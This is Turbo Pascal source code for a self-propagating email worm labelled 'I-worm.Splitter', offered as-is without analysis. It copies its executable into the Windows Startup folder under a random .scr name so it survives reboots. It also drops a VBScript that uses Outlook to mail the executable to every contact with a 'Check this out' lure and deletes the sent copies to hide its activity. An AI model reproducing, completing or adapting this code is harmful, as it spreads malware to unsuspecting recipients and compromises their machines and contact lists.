   {------------------------------}
   {I-worm.Splitter By Psychologic}
   {Compile with TPW 1.5          }
   {------------------------------}
   uses wincrt;
   var darifile,kefile,kf1:file;
   nobaca,notulis:word;
   worm:text;
   buffer:array[1..2048]of char;
   sumber,kopian,tujuan,s,st,sa:string[79];
   dir1,kop1:string;
   i,a:integer;
   begin
       {$i-}
       clrscr;
       getdir(0,s);
       dir1:='C:\WINDOWS\Start Menu\Programs\StartUp\';
       assign(darifile,paramstr(0));
       reset(darifile,1);
       Randomize;
       st:='';
       a := random(10)+4;
       for i:=1 to a do st:=st+chr(random(26)+97);
       tujuan:='C:\WINDOWS\Start Menu\Programs\StartUp\'+st+'.scr';
       kop1:=s+'\'+st+'.scr';
       Assign (worm,'C:\Windows\STARTM~1\programs\startup\'+st+'.vbs');
       Rewrite (worm);
           writeln (worm,'myself = Wscript.ScriptFullName');
           writeln (worm,'set fso = createobject("scripting.filesystemobject")');
           writeln (worm,'Set gqlbgmbg=CreateObject("Outlook.Application")');
           writeln (worm,'Set gqlbgqlb=gqlbgmbg.GetNameSpace("MAPI")');
           writeln (worm,'For Each C In gqlbgqlb.AddressLists');
           writeln (worm,'If C.AddressEntries.Count <> 0 Then');
           writeln (worm,'For D=1 To C.AddressEntries.Count');
           writeln (worm,'Set bgqhqlbg=C.AddressEntries(D)');
           writeln (worm,'Set gqlbhqmb=gqlbgmbg.CreateItem(0)');
           writeln (worm,'gqlbhqmb.To=bgqhqlbg.Address');
           writeln (worm,'gqlbhqmb.Subject="Heyy..!! Check this out"');
           writeln (worm,'gqlbhqmb.Body="Heyy.. Check this file"');
           writeln (worm,'gqlbhqmb.Attachments.Add("'+paramstr(0)+'")');
           writeln (worm,'gqlbhqmb.DeleteAfterSubmit=True');
           writeln (worm,'If gqlbhqmb.To <> "" Then');
           writeln (worm,'gqlbhqmb.Send');
           writeln (worm,'End If');
           writeln (worm,'Next');
           writeln (worm,'End If');
           writeln (worm,'Next');
       Close(worm);
       assign(kefile,tujuan);
       rewrite(kefile,1);
       assign(kf1,kop1);
       rewrite(kf1,1);
       if IOResult<>0 then
           begin
               exit;
           end;
       repeat
           blockread(darifile,buffer,sizeof(buffer),nobaca);
           blockwrite(kefile,buffer,nobaca,notulis);
           blockwrite(kf1,buffer,nobaca,notulis);
       until (nobaca=0) or (notulis<>nobaca);
       close(darifile);
       close(kefile);
       close(kf1);
       writeln;
       writeln('Finished');
       writeln('I-worm.Splitter By Psychologic');
       writeln('Hit Enter');
       readln;
   end.
